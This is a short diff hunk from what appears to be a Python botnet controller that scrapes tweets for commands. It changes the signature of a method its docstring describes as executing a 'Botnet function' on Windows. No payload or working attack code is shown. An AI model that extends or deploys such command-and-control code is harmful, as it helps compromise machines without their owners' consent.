@@ -99,7 +99,7 @@ class TweetScrape():
         else:
             return cmd.group(0) #, cmd.group(1) # group(0) for everything
 
-    def windows_cmdExcution(command, machine):
+    def windows_cmdExcution(self, command):
         '''
             Parameters: 
                     Command: Botnet function to execute.
